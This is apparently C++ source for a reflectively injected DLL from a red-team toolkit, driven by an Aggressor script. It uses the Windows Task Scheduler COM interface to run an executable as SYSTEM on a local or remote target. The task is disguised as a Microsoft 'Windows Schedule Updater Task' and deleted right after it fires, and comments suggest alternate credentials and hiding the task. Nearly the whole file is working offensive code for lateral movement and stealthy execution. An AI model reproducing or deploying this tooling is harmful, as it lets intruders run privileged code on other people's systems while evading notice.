// dllmain.cpp : Defines the entry point for the DLL application.
// I pulled from quite a few different sources, if I missed yours let me know and I'll add it in
// Reference - https://docs.microsoft.com/en-us/windows/desktop/TaskSchd/logon-trigger-example--c---
// Reference - https://www.codeproject.com/Articles/13089/Harnessing-the-task-scheduler
// Reference - https://www.pcreview.co.uk/threads/create-a-new-task-scheduler-using-itaskservice-in-vista.3444373/
// Reference - https://docs.microsoft.com/en-us/windows/desktop/taskschd/registration-trigger-example--c---
// Reference - https://docs.microsoft.com/en-us/windows/desktop/taskschd/weekly-trigger-example--scripting-https://docs.microsoft.com/en-us/windows/desktop/taskschd/weekly-trigger-example--scripting-

#include "ReflectiveDLLInjection.h"
#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <comdef.h>
//  Include the task header file.
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

int StartIT(char* lpTarget)
{
	//Check for IP
	if (strlen(lpTarget) > 15)
	{
		printf("\nSomething is up with your target, IPs only ... sorry");
		return 0;
	}

	//Target passed from Aggressor script. If local this isn't used.
	variant_t vtTarget = lpTarget;	
	//This is where you could put in alternate connection creds
	variant_t vtUsername;
	vtUsername.vt = VT_EMPTY;
	variant_t vtPassword;
	vtPassword.vt = VT_EMPTY;
	variant_t vtDomain;
	vtDomain.vt = VT_EMPTY;
	//This will end up being NULL unless you want to configure alternate runas creds
	variant_t vtRunasPassword;
	vtRunasPassword.vt = VT_EMPTY;
	//SYSTEM for SYSTEM. NULL for authenticating user
	variant_t vtRunasUser = "SYSTEM";

	//Task settings. This works in conjunction with the Aggressor script; change it here, change it there.
	_bstr_t bsTaskName = L"Windows Schedule Updater Task";
	_bstr_t bsFolderPath = L"\\";
	_bstr_t bsAuthor = L"Microsoft";
	_bstr_t bsDescription = L"";
	_bstr_t bsExePath = L"c:\\windows\\system32\\wschupdater.exe";

	//When should the task trigger. TASK_TRIGGER_REGISTRATION will start the task when it's registered.
	//https://docs.microsoft.com/en-us/windows/desktop/api/taskschd/ne-taskschd-_task_trigger_type2
	_TASK_TRIGGER_TYPE2 iTaskAction = TASK_TRIGGER_REGISTRATION;

	//What should the task execute. TASK_ACTION_COM_HANDLER looks interesting ... maybe later
	_TASK_ACTION_TYPE iTaskActionType = TASK_ACTION_EXEC;
	//High Integrity Session or Low Integrity Session
	_TASK_RUNLEVEL iTaskRunLevel = TASK_RUNLEVEL_HIGHEST;

	//If you want to hide the task, creation and deletion of the task is pretty quick.
	bool boHiddenTask = false;

	ITaskService *pService = NULL;
	ITaskDefinition *pTask = NULL;
	IRegisteredTask *pRegTask = NULL;
	IRegistrationInfo *pRegInfo = NULL;
	ITaskFolder *rootFolder = NULL;
	ITaskSettings *pTS = NULL;
	ITriggerCollection *pTrigCol = NULL;
	IActionCollection *pACol = NULL;
	IAction *pAct = NULL;
	IExecAction *pEAct = NULL;
	IPrincipal *pPri = NULL;

	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		printf("\nCoInitalizeEx Failed: %x", hr);
		return 0;
	}

	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hr))
	{
		printf("\nCoInitializeSecurity Failed: %x", hr);
		CoUninitialize();
		return 0;
	}

	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr))
	{
		printf("\nCoCreateInstance Failed: %x", hr);
		CoUninitialize();
		return 0;
	}

	if (strcmp(lpTarget, "127.0.0.1") == 0)
	{
		printf("\nLocal Target Selected");
		hr = pService->Connect(variant_t(), variant_t(), variant_t(), variant_t());
	}
	else
	{
		printf("\nRemote Target Selected");
		hr = pService->Connect(vtTarget, vtUsername, vtDomain, vtPassword);
	}
	//hr = pService->Connect(vtTarget, vtUsername, vtDomain, vtPassword);
	if (FAILED(hr))
	{
		printf("\nITaskService Connect Failed: %x", hr);
		pService->Release();
		CoUninitialize();
		return 0;
	}

	hr = pService->GetFolder(bsFolderPath, &rootFolder);
	if (FAILED(hr))
	{
		printf("\nITaskFolder Failed: %x", hr);
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 0;
	}

	hr = pService->NewTask(0, &pTask);
	if (FAILED(hr))
	{
		printf("\nNewTask Failed: %x", hr);
		pTask->Release();
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 0;
	}

	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr))
	{
		printf("\nGetRegistrationInfo Failed: %x", hr);
		pRegInfo->Release();
		pTask->Release();
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	pRegInfo->put_Author(bsAuthor);
	pRegInfo->put_Description(bsDescription);
	pRegInfo->Release();

	hr = pTask->get_Settings(&pTS);
	if (FAILED(hr))
	{
		printf("\nGetSettings Failed: %x", hr);
		pTS->Release();
		pTask->Release();
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 0;
	}

	pTS->put_Enabled(true);
	pTS->put_StartWhenAvailable(true);
	pTS->put_Hidden(boHiddenTask);
	pTS->Release();

	//If you want to spawn medium integrity sessions change TASK_RUNLEVEL_HIGHEST to TASK_RUNLEVEL_LUA
	pTask->get_Principal(&pPri);
	hr = pPri->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
	pPri->Release();
	if (FAILED(hr))
	{
		printf("\nPutRunLevel Failed: %x", hr);
		pTask->Release();
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 0;
	}

	hr = pTask->get_Triggers(&pTrigCol);
	if (FAILED(hr))
	{
		printf("\nGetTriggers Failed: %x", hr);
		pTrigCol->Release();
		pTask->Release();
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 0;
	}

	pTrigCol->Create(iTaskAction, NULL);
	//You could put additional triggers here ... I think
	pTrigCol->Release();

	hr = pTask->get_Actions(&pACol);
	if (FAILED(hr))
	{
		printf("\nGetActions Failed: %x", hr);
		pACol->Release();
		pTask->Release();
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 0;
	}

	pACol->Create(iTaskActionType, &pAct);
	pAct->QueryInterface(IID_IExecAction, (void**)&pEAct);
	pEAct->put_Path(bsExePath);
	pEAct->Release();
	pAct->Release();
	pACol->Release();

	hr = rootFolder->RegisterTaskDefinition(bsTaskName, pTask, TASK_CREATE_OR_UPDATE, vtRunasUser, vtRunasPassword, TASK_LOGON_INTERACTIVE_TOKEN, variant_t(), &pRegTask);
	if (FAILED(hr))
	{
		printf("\nRegisterTaskDefinition Failed: %x", hr);
		printf("\nLocal target requires high integrity session");
		pTask->Release();
		rootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 0;
	}
	//Delete Task
	rootFolder->DeleteTask(bsTaskName, NULL);

	//Release Objects
	pTask->Release();
	rootFolder->Release();
	pService->Release();
	CoUninitialize();
	return 1;
}

extern "C" HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL) {
			printf("Targeting '%s'", (char *)lpReserved);
			int iCheck = StartIT((char *)lpReserved);
			if (iCheck == 1)
				printf("\nLooks like everything ran fine");
			else
				printf("\nLooks like something went wrong");
		}
		else {
			printf("\nThere is no parameter");
			break;
		}
		fflush(stdout);
		//ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}